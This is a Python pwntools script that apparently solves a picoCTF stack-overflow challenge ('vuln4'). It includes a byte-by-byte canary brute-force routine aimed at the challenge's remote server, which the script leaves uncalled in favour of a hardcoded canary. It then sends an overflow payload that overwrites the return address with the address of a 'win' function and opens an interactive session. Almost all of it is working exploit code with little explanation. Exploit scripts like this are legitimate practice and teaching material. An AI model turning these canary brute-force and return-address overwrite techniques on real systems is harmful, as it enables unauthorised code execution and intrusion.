from pwn import *

elf = ELF('vuln4', checksec=True)

canary_size = 4
buf_size = 64

win_addr = elf.symbols['win']
print(hex(win_addr))
offset_to_fill = buf_size + canary_size + 16 + 4  # overflow buffer size + input found canary + 16 bytes of random stuff can be found by finding the diff between canary address and return address, + 4 bytes for the return address

io = remote('saturn.picoctf.net', 59024)


def brute_force_canary(canary_size: int, error_msg: str) -> str:
    # canary bruteforce: override canary byte-by-byte, and thus can guess from the 1st to 4th byte the correct value (no stack smashing error)
    try_count = 0
    total_tries = canary_size * 256  # 256 is from 00 to FF in each byte
    canary = ''
    while len(canary) < canary_size:  # size is up to 4
        for i in range(256):  # from 00 to FF in each byte but ascii is only up to 127
            try_count += 1
            print(f'Try {try_count}/{total_tries}')
            print(f'Trying {canary+chr(i)}')
            io = remote('saturn.picoctf.net', 59024)
            io.sendlineafter('How Many Bytes will You Write Into the Buffer?\n> ', str(buf_size + len(canary) + 1))  # buf_size + canary size + 1 intending to write past canary
            io.sendlineafter('Input> ', 'A' * buf_size + canary + chr(i))  # chr(i) will be the (next) guessed byte of the canary, so here we are sending known canary bytes + chr(i) where chr(i) is the newly guessed byte
            l = io.recvline()
            if error_msg not in str(l):
                canary += chr(i)
                print(f'Partial canary: {canary}')
                print(f'Current found size: {len(canary)}')
                break
            io.close()
    print(f'Found canary: {canary}')
    return canary


# canary = brute_force_canary(canary_size, '***** Stack Smashing Detected ***** : Canary Value Corrupt!')
canary = b'BiRd'

length_to_write = offset_to_fill
io.sendlineafter('How Many Bytes will You Write Into the Buffer?\n> ', str(length_to_write))
payload = b'A' * buf_size + canary + b'A' * 16 + p32(win_addr)  # 16 here is arbitrary and can be found in IDA by finding the diff between canary address and return address
print(payload)
io.sendlineafter(b'Input> ', payload)

io.interactive()
